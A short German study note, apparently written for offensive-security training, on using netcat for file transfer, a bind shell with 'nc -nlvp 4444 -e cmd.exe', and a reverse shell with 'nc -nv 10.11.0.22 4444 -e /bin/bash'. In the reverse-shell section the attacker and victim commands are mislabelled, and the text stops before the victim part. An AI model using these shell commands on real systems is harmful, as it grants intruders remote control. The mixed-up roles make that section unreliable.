# OffSec -  Netcat

## Datenübertragung
Mit #Netcat kann man auch Daten #übertragen. 
Hierzu ist wie folgt vorzugehen.

Auf dem Client wird eim TCP-Listening Port geöffnet und der Output in eine "incoming.exe" geschrieben

`nc -nlvp 4444 > incoming.exe`

Auf dem Host wird nun der folgende Befehl eingesetzt:

`nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`

## Netcat Bindshell

Auf dem Opferrechner kann via #Netcat eine #BindShell gespawnt werden.

`nc -nlvp 4444 -e cmd.exe`

Mit der -e Option führt der Rechner nun das nachstehende Kommando aus, sobald sich jemand mit dem Listener verbindet.

Wenn man sich nun mittels dem Befehl:
`nc -nv 10.11.0.22 4444` 
Auf den Rechner schaltet, erhält man eine #BindShell.

## Netcat Reverseshell

Wenn nun nicht die Möglichkeit besteht eine #BindShell zu öffnen, da es zum Beispiel keine Möglichkeit gibt eingehenden Traffic des Routers an den Client weiterzuleiten, kann eine #Reverseshell eingesetzt werden.
Hierbei öffnet der Angreiffer einen #Listener auf seinem Client und das Opfer sendet eine Shell an den geöffneten Port

Angreifer:
`nc -nv 10.11.0.22 4444 -e /bin/bash` <- Wartet auf Verbindung

Opfer:
